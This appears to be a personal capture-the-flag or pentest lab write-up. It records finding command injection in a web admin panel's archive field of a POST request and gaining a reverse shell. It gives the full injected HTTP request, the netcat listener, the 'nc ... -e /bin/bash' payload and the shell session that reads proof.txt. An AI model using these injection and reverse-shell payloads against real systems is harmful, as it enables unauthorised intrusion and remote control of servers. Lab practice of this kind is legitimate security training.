testing here
![[Pasted image 20250107011411.png]]
utilized `/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt` in `intruder` against this post request, injected after `archive` and was able to get a `netstat` result
```http
POST /admin/index.php HTTP/1.1
Host: 192.168.61.86
Content-Length: 57
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.61.86
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.61.86/admin/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=b3d6424be60a91ddc4db7ca032a17e62
Connection: keep-alive

blogPost=test&compressCheckbox=on&archiveCheckbox=archiveÂ§
```
looks like we have `LCE` with `;netstat -a;` - box crashed after finding this, need to revert
![[Pasted image 20250107005727.png]]
unable to hit my own machine with `curl http://192.168.49.61:80/test.txt` we only have `LCE`
![[Pasted image 20250107010507.png]]
`id`
![[Pasted image 20250107010415.png]]
`nc` is on the machine at `/bin/nc`

![[Pasted image 20250107010635.png]]
since we know that `netcat` is on the machine we should be able to get a reverse shell

setup `listener` with 
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[07Jan2025 06:01:47]-[/usr/share/payloadsallthethings/Command Injection/Intruder]
â””â”€# nc -lvnp 1337
listening on [any] 1337 ...
```
![[Pasted image 20250107010926.png]]
send `payload` to kick off `netcat`
```bash
nc 192.168.49.61 1337 -e /bin/bash
```
full `POST`
```http
POST /admin/index.php HTTP/1.1
Host: 192.168.61.86
Content-Length: 93
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.61.86
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.61.86/admin/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=b3d6424be60a91ddc4db7ca032a17e62
Connection: keep-alive

blogPost=test&compressCheckbox=on&archiveCheckbox=archive;nc 192.168.49.61 1337 -e /bin/bash;
```
screenshot of `POST`
![[Pasted image 20250107011048.png]]caught `reverse shell` and got `proof.txt`

![[Pasted image 20250107011127.png]]
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[07Jan2025 06:01:47]-[/usr/share/payloadsallthethings/Command Injection/Intruder]
â””â”€# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.49.61] from (UNKNOWN) [192.168.61.86] 57120

whoami
www-data
ls
blogAdmin.php
index.php
proof.txt
cat proof.txt
e9228b4481d54007cd32590ff5b336e2
```